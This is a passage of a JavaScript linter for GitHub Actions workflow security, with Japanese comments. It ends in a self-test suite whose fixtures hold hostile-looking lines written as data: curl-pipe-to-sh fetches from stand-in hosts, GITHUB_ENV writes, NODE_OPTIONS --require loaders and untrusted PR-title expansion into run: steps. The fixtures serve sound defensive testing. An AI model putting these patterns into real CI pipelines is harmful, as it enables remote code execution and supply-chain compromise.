      if (UNTRUSTED_CONTEXT.test(line.replace(SAFE_CONTEXT, ''))) {
        problems.push({
          file: `${name}:${ln}`,
          why: `run: へ信用できない値を展開している — ${line.trim().slice(0, 80)}`,
        });
        continue; // 同じ行を 2 度報告しない (下の構造規則より、こちらの説明が具体的)
      }
      if (TEMPLATE_EXPR.test(line)) {
        problems.push({
          file: `${name}:${ln}`,
          why: `run: の中で ${'$'}{{ }} を展開している — env: へ束ねて $VAR で読むこと — ${line.trim().slice(0, 80)}`,
        });
      }
      // 内容そのものの危険 (パス 530)。シェルの注記の行は読まない。
      if (!/^\s*#/.test(line)) {
        const body = runBodyProblem(line) ?? (joinedBodies.has(ln) && joinedBodies.get(ln) !== line ? runBodyProblem(joinedBodies.get(ln)) : null);
        // ローダ環境変数は上の全行走査が同じ行を報告済み —— 二重に鳴らさない。
        if (body && !loaderEnvProblem(line)) {
          problems.push({ file: `${name}:${ln}`, why: `run: — ${body} — ${line.trim().slice(0, 80)}` });
        }
      }
    }
  }
  // 台帳の掃除: 直したのに項目が残っていたら落とす。
  for (const ref of Object.keys(allow)) {
    if (!seenUnpinned.has(ref)) {
      problems.push({ file: '(台帳)', why: `${ref} はもう使われていない — 台帳から消すこと` });
    }
  }
  // job 権限の台帳の逆向き: 載っている job が実物に (同じ scope で) 無ければ落とす。
  // 残った項目は、その job が後で戻ってきたときにあらかじめ免除されている穴になる。
  for (const [file, jobs] of Object.entries(jobAllow)) {
    for (const [job, entry] of Object.entries(jobs)) {
      if (!entry || !Array.isArray(entry.scopes) || entry.scopes.length === 0 || !entry.why) {
        problems.push({ file: '(台帳)', why: `${file} / ${job} — scopes と why を書くこと` });
        continue;
      }
      if (!names.has(file) || !seenJobBlocks.has(`${file}::${job}`)) {
        problems.push({
          file: '(台帳)',
          why: `${file} の job "${job}" に台帳どおりの permissions: が無い — 台帳から消すか実物を直すこと`,
        });
      }
    }
  }
  return problems;
}

/**
 * `uses: actions/checkout@…` の step (行 i) が `with: persist-credentials: false` を
 * 持つか。step の範囲は「次の `- ` (同じ段) か、段が浅くなる行」まで。
 * `persist-credentials: false` 以外の値 (`true` / 空) は持たないと数える。
 */
function stepPersistsNoCredentials(lines, i) {
  const dash = /^(\s*)-/.exec(lines[i]);
  if (!dash) return false;
  const kid = `${dash[1]}  `;
  for (let j = i + 1; j < lines.length; j++) {
    const ln = lines[j];
    if (ln.trim() === '') continue;
    if (!ln.startsWith(kid) || ln.startsWith(`${dash[1]}-`)) break;
    if (/^\s*persist-credentials:\s*false\b/.test(ln)) return true;
  }
  return false;
}

function selfTest() {
  const cases = [
    ['permissions 未宣言を落とす', [{ name: 'x.yml', text: 'name: x\non:\n  push:\n' }], 1],
    ['フロー記法の step (- {uses: …}) を落とす (T-145)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - {uses: evilorg/act@v1}\n` }], 1],
    ['引用符つきの鍵 (- "run": …) を落とす (T-145)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - "run": curl https://x | sh\n` }], 1],
    ['jobs: {…} のフロー記法を落とす (T-145)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs: {a: {steps: []}}\n` }], 1],
    ['ci.yml の step に continue-on-error を置くと落とす (T-145)', [{ name: 'ci.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: npm run lint:malware\n        continue-on-error: true\n` }], 1],
    ['ci.yml の step に if: を置くと落とす (T-145)', [{ name: 'ci.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: npm run lint:malware\n        if: github.event_name != 'pull_request'\n` }], 1],
    ['ci.yml の pull_request に paths-ignore を置くと落とす (T-145)', [{ name: 'ci.yml', text: `permissions:\n  contents: read\non:\n  pull_request:\n    paths-ignore: ['scripts/**']\n` }], 1],
    ['release.yml の job の if: は落とさない (ゲートの workflow ではない)', [{ name: 'release.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    if: github.ref == 'refs/heads/main'\n    steps:\n      - run: echo\n` }], 0],
    ['uses : (鍵と : の間の空白) を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses : evilorg/act@v1\n' }], 1],
    ['uses: の値を次の行へ送る書き方を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses:\n          evilorg/act@v1\n' }], 1],
    ['アンカー付きの step を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - &a uses: evilorg/act@v1\n' }], 1],
    ['curl の次の行に sh が続く形を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: |\n          curl https://x |\n            sh\n' }], 1],
    ['書き込み先を組み立てる GITHUB_ENV を落とす (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: |\n          echo "A=b" >> "${F}NV"\n' }], 1],
    ['対照: 単独の $GITHUB_OUTPUT への追記は落とさない (T-160)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: |\n          echo "k=v" >> "$GITHUB_OUTPUT"\n' }], 0],
    ['注記の中のフロー記法は落とさない', [{ name: 'x.yml', text: `permissions:\n  contents: read\n# - {uses: x@v1} は書かない\njobs:\n  a:\n    steps:\n      - run: echo\n` }], 0],
    ['permissions があれば通す', [{ name: 'x.yml', text: 'name: x\npermissions:\n  contents: read\n' }], 0],
    [
      'pull_request_target を落とす',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\non:\n  pull_request_target:\n' }],
      1,
    ],
    ['pull_request_target を `on: x` の形で落とす (T-085)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\non: pull_request_target\n' }], 1],
    ['pull_request_target を flow 配列で落とす (T-085)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\non: [push, pull_request_target]\n' }], 1],
    ['pull_request_target を引用符つきの鍵で落とす (T-085)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\non:\n  "pull_request_target":\n' }], 1],
    ['注記の中の pull_request_target は落とさない (T-085)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\n# pull_request_target は使わない\non:\n  push:\n' }], 0],
    ['github-script の script: への ${{ }} 展開を落とす (T-085)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/github-script@${'d'.repeat(40)} # v1\n        with:\n          script: |\n            core.info('${'$'}{{ github.event.inputs.x }}')\n` }], 1],
    [
      '第三者 action のタグ固定を落とす',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: evil/thing@v1\n' }],
      1,
    ],
    [
      '第三者 action の SHA 固定は通す',
      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: evil/thing@${'a'.repeat(40)} # v1\n` }],
      0,
    ],
    [
      'actions/* の版のタグは落とす (動く参照 · T-057)',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/setup-node@v5\n' }],
      1,
    ],
    [
      'actions/* の SHA 固定は通す (注記の # vN は読まない)',
      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/setup-node@${'b'.repeat(40)} # v5\n` }],
      0,
    ],
    [
      'checkout が persist-credentials を持たなければ落とす (T-056)',
      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)} # v1\n      - run: echo hi\n` }],
      1,
    ],
    [
      'checkout の persist-credentials: true は「持たない」と数える',
      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)} # v1\n        with:\n          persist-credentials: true\n` }],
      1,
    ],
    [
      '次の step の with: は数えない (段で区切る)',
      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)} # v1\n      - uses: actions/setup-node@${'b'.repeat(40)} # v1\n        with:\n          persist-credentials: false\n` }],
      1,
    ],
    [
      'checkout に persist-credentials: false (他の with: と並んでも) は通す',
      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@${'c'.repeat(40)} # v1\n        with:\n          fetch-depth: 2\n          persist-credentials: false\n      - run: echo hi\n` }],
      0,
    ],
    [
      'PR の題名を run: へ展開したら落とす',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: echo "${{ github.event.pull_request.title }}"\n' }],
      1,
    ],
    [
      'head_ref を run: へ展開したら落とす',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: git checkout "${{ github.head_ref }}"\n' }],
      1,
    ],
    // GitHub が決める値 (SHA / event_name) は「注入できない値」ではあるが、
    // run: へ展開する形そのものを禁じる — 安全な文脈の列挙を維持しなくて済む。
    [
      'GitHub が決める値でも run: への展開なら落とす',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: echo "${{ github.event_name }} ${{ github.event.before }}"\n' }],
      1,
    ],
    // ここが実際に網の外を通っていた形 (mutation.yml, 2026-08-23)。
    [
      'steps.*.outputs.* を run: へ展開したら落とす',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: npx stryker run --mutate "${{ steps.scope.outputs.targets }}"\n' }],
      1,
    ],
    [
      'inputs.* (workflow_dispatch は利用者が値を書く) も落とす',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: echo "${{ inputs.tag }}"\n' }],
      1,
    ],
    // 直し方 = env: へ束ねて $VAR で読む。これは通らないといけない (直せない規則は
    // 規則ではない)。
    [
      'env: へ束ねて $VAR で読む形は通す',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - env:\n          T: ${{ steps.scope.outputs.targets }}\n        run: npx stryker run --mutate "$T"\n' }],
      0,
    ],
    // run: の外はシェルではない (with: は action の入力、if:/key: は式エンジンが
    // 評価する) ので、シェル構文になる余地が無い。
    [
      'run: の外の展開は見ない (action の with: など)',
      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: actions/x@${'d'.repeat(40)} # v1\n        with:\n          t: \${{ github.event.pull_request.title }}\n` }],
      0,
    ],
    [
      'if: / key: の式は見ない',
      [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - if: steps.scope.outputs.mode == 'some'\n        uses: actions/cache@${'d'.repeat(40)} # v1\n        with:\n          key: stryker-\${{ github.ref_name }}\n` }],
      0,
    ],
    // 許可台帳をプロトタイプ鎖経由ですり抜けられないこと。`UNPINNED_ALLOW[ref]`
    // と素で引いていた頃は `uses: constructor` が `Object` を返して truthy に
    // なり、**未固定の検査ごと飛ばされていた** (2026-08-22)。
    // パス 530 (threat: T-120): ローカル action・docker://・run: の本文・版の注記。
    ['実在しないローカル action を指す uses: ./ を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: ./.github/actions/nope\n' }], 1],
    [
      '実在するローカル action は通り、その中の未固定 action を落とす (T-120)',
      [
        { name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: ./.github/actions/y\n' },
        { name: 'actions/y/action.yml', text: 'runs:\n  using: composite\n  steps:\n    - uses: evil/thing@v1\n' },
      ],
      1,
    ],
    ['docker:// のタグ固定を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: docker://alpine:3.20\n' }], 1],
    // パス 533 (threat: T-123): job の container: / services: のイメージ。
    ['container: のタグ固定を落とす (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    container: node:20\n    steps:\n      - run: echo hi\n' }], 1],
    ['container.image のタグ固定を落とす (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    container:\n      image: node:20\n    steps:\n      - run: echo hi\n' }], 1],
    ['services の image のタグ固定を落とす (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    services:\n      db:\n        image: postgres:16\n      cache:\n        image: redis:7\n    steps:\n      - run: echo hi\n' }], 2],
    ['container のダイジェスト固定は通す (T-123)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    container: node:20@sha256:${'a'.repeat(64)}\n    services:\n      db:\n        image: "postgres:16@sha256:${'b'.repeat(64)}" # pinned\n    steps:\n      - run: echo hi\n` }], 0],
    ['container 内の式で組んだイメージを落とす (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    container:\n      image: ${{ matrix.img }}\n    steps:\n      - run: echo hi\n' }], 1],
    ['container: の外の image: は見ない (T-123)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: echo hi\n    env:\n      image: x\n' }], 0],
    ['SHA 固定に版の注記が無ければ落とす (T-120)', [{ name: 'x.yml', text: `permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: evil/thing@${'a'.repeat(40)}\n` }], 1],
    ['run: の curl | sh を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: curl -fsSL https://e.example/i | sh\n' }], 1],
    ['run: の GITHUB_ENV への書き込みを落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - run: echo X=1 >> $GITHUB_ENV\n' }], 1],
    ['env: の NODE_OPTIONS --require を落とす (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - env:\n          NODE_OPTIONS: --require ./e.js\n        run: npm test\n' }], 1],
    ['NODE_OPTIONS=--max-old-space-size は通す (T-120)', [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - env:\n          NODE_OPTIONS: --max-old-space-size=4096\n        run: npm test\n' }], 0],
    [
      'プロトタイプ側の名前で台帳をすり抜けない (constructor)',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: constructor\n' }],
      1,
    ],
    [
      'プロトタイプ側の名前で台帳をすり抜けない (toString)',
      [{ name: 'x.yml', text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: toString\n' }],
      1,
    ],
  ];
  let bad = 0;
  for (const [label, list, expected] of cases) {
    // 台帳の掃除チェックは合成ケースでは無関係なので除く。
    const n = check(list).filter((p) => p.file !== '(台帳)').length;
    const ok = n === expected;
    if (!ok) bad++;
    console.log(`  ${ok ? '✓' : '✗'} ${label}: ${n} 件 (期待 ${expected})`);
  }
  /*
   * **台帳の掃除の枝には検査が 1 件も無かった。**
   *
   * 上のループは `(台帳)` の findings を意図的に除いている (合成ケースには
   * 無関係だから) ので、この枝は self-test の外に居た。本番スキャンでも
   * 実物の台帳の項目は**今まさに使用中**なので何も出ない。
   * つまり「誰かが SHA 固定に直したのに台帳から消し忘れた」という
   * **未来の状態でしか動かない枝**が、無検査で置かれていた。
   *
   * 消し忘れた台帳の項目は**永久に開いたままの穴**である ——
   * その action が後で戻ってきたとき、あらかじめ免除されている。
   */
  const clean = { name: 'x.yml', text: 'permissions:\n  contents: read\n' };
  const used = {
    name: 'x.yml',
    text: 'permissions:\n  contents: read\njobs:\n  a:\n    steps:\n      - uses: vendor/act@v1\n',
  };
  const ledgerCases = [
    ['台帳の項目が使われていなければ鳴る', [clean], { 'vendor/act@v1': {} }, 1],
    ['台帳の項目が使われていれば鳴らない', [used], { 'vendor/act@v1': {} }, 0],
    ['台帳が空なら何も出ない', [clean], {}, 0],
    ['台帳に無い未固定は台帳の掃除では鳴らない (別の枝の仕事)', [used], {}, 0],
  ];
  for (const [label, list, allow, expected] of ledgerCases) {
    const n = check(list, allow, {}).filter((p) => p.file === '(台帳)').length;
    const ok = n === expected;
    if (!ok) bad++;
    console.log(`  ${ok ? '✓' : '✗'} 台帳の掃除: ${label}: ${n} 件 (期待 ${expected})`);
  }

  /*
   * job 権限の台帳 (threat: T-039)。実物 (`pages.yml` の deploy) を縮めた標本で、
   * 「台帳どおり → 0 件 / 台帳に無い job → 1 件 / scope が違う → 1 件 /
   *  台帳に在るのに実物に無い → (台帳) 1 件 / 1 行の値も読む / トップレベルは数えない」。
   */
  const jobWf = (perm) => ({
    name: 'p.yml',
    text: `permissions:\n  contents: read\njobs:\n  build:\n    steps:\n      - run: npm ci\n  deploy:\n    needs: build\n${perm}    steps:\n      - uses: actions/deploy-pages@v4\n`,
  });
  const deployAllow = { 'p.yml': { deploy: { scopes: ['pages: write', 'id-token: write'], why: 'x' } } };
  const jobCases = [
    ['台帳どおりの job 権限は通る', [jobWf('    permissions:\n      pages: write\n      id-token: write\n')], deployAllow, 0, 0],
    ['台帳に無い job の permissions: は落ちる', [jobWf('    permissions:\n      pages: write\n      id-token: write\n')], {}, 1, 0],
    ['scope が 1 つ多いと落ちる', [jobWf('    permissions:\n      pages: write\n      id-token: write\n      contents: write\n')], deployAllow, 1, 0],
    ['scope が 1 つ少なくても落ちる', [jobWf('    permissions:\n      pages: write\n')], deployAllow, 1, 0],
    ['台帳に在るのに実物に無ければ (台帳) で落ちる', [jobWf('')], deployAllow, 0, 1],
    ['別の job に同じ scope が付いても台帳の job ではない', [{ name: 'p.yml', text: 'permissions:\n  contents: read\njobs:\n  build:\n    permissions:\n      pages: write\n      id-token: write\n    steps:\n      - run: npm ci\n' }], deployAllow, 1, 1],
    ['1 行の値 (read-all) も scope として読む', [jobWf('    permissions: read-all\n')], { 'p.yml': { deploy: { scopes: ['read-all'], why: 'x' } } }, 0, 0],
    ['トップレベルの permissions: は job の台帳では数えない', [jobWf('')], {}, 0, 0],
    ['台帳の scopes が空なら (台帳) で落ちる', [jobWf('    permissions:\n      pages: write\n')], { 'p.yml': { deploy: { scopes: [], why: 'x' } } }, 1, 1],
  ];
  for (const [label, list, jobAllow, expectJob, expectLedger] of jobCases) {
    const ps = check(list, {}, jobAllow);
    const nJob = ps.filter((p) => p.file !== '(台帳)' && /permissions/.test(p.why)).length;
    const nLedger = ps.filter((p) => p.file === '(台帳)').length;
    const ok = nJob === expectJob && nLedger === expectLedger;
    if (!ok) bad++;
    console.log(`  ${ok ? '✓' : '✗'} job 権限の台帳: ${label}: job ${nJob} / 台帳 ${nLedger} 件 (期待 ${expectJob} / ${expectLedger})`);
  }

  // YAML として読めるか (パス 546)。bad / ok は同じ関数に通して件数を見る。
  const yamlCases = [
    ['step 名に ": " を含む (引用符なし) を落とす', 'jobs:\n  a:\n    steps:\n      - name: Smoke (packaged app: fuses applied)\n        run: echo\n', 1],
    ['対照: 引用符で囲めば通す', "jobs:\n  a:\n    steps:\n      - name: 'Smoke (packaged app: fuses applied)'\n        run: echo\n", 0],
    ['対照: コメントの中の ": " は通す', 'jobs:\n  a:\n    steps:\n      # packaged app: fuses\n      - run: echo\n', 0],
  ];
  for (const [label, text, expected] of yamlCases) {
    const n = yamlParseProblem('x.yml', text) ? 1 : 0;
    const ok = n === expected;
    if (!ok) bad++;
    console.log(`  ${ok ? '✓' : '✗'} YAML の構文: ${label}: ${n} 件 (期待 ${expected})`);
  }

  if (bad > 0) {
    console.error(`❌ self-test 不一致 ${bad} 件`);
    return 1;
  }
  console.log('✅ self-test 全件一致');
  return 0;
}

function main() {
  if (process.argv.includes('--self-test')) return selfTest();
  const list = workflows();
  const flows = list.filter((w) => !isLocalActionName(w.name));
  const actionCount = list.length - flows.length;
  // ディレクトリが無い・拾えない = 0 件を「問題なし」と読まない (実測 5 本、2026-09-05)。
  const MIN_WORKFLOWS = 3;
  if (flows.length < MIN_WORKFLOWS) {
    console.error(`❌ .github/workflows/ の YAML を ${flows.length} 本しか拾えませんでした (${MIN_WORKFLOWS} 本以上を期待)。走査が壊れています。`);
    process.exit(1);
  }
  // 2 つ目の数え方: 追跡されている workflow とローカル action は、どれも走査に出る (パス 472 / 530)。
  const cross = reportTrackedCrossCheck(
    list.map((w) => scanRelPath(w.name)), CROSS_CHECK, REPO_ROOT, 'lint:workflow-security');
  if (cross.code !== 0) process.exit(1);
  const problems = [...list.map((w) => yamlParseProblem(w.name, w.text)).filter(Boolean), ...check(list)];
  const ledger = Object.keys(UNPINNED_ALLOW).length;
  const jobLedger = Object.values(JOB_PERMISSIONS_ALLOW).reduce((n, jobs) => n + Object.keys(jobs).length, 0);
  console.log(
    `Checked ${flows.length} workflow(s) + ${actionCount} local action(s): permissions / 第三者 action の SHA 固定 / ` +
      `pull_request_target / run: への ${'$'}{{ }} 展開 / run: の本文 (遠隔コード・GITHUB_ENV・ローダ環境変数) / ローカル action・docker:// / job 単位の permissions (台帳: 未固定 ${ledger} 件 · job 権限 ${jobLedger} 件 · ${crossCheckSuffix(cross.source)})`,
  );
  if (problems.length === 0) {
    console.log('✅ ワークフローの守りは台帳どおりです');
    for (const [ref, e] of Object.entries(UNPINNED_ALLOW)) {
      console.log(`   ⚠ 未固定 (台帳): ${ref} — ${e.howToFix}`);
    }
    return 0;
  }
  console.error(`❌ ${problems.length} 件:`);
  for (const p of problems) console.error(`  ${p.file}: ${p.why}`);
  return 1;
}

module.exports = { yamlParseProblem, structureProblems, GATE_NEUTERING_ALLOW, check, runBlockLines, workflows, localActionFiles, localUsesProblem, loaderEnvProblem, runBodyProblem, scanRelPath, isLocalActionName, jobPermissionBlocks, UNPINNED_ALLOW, JOB_PERMISSIONS_ALLOW, CROSS_CHECK };

if (require.main === module) process.exit(main());
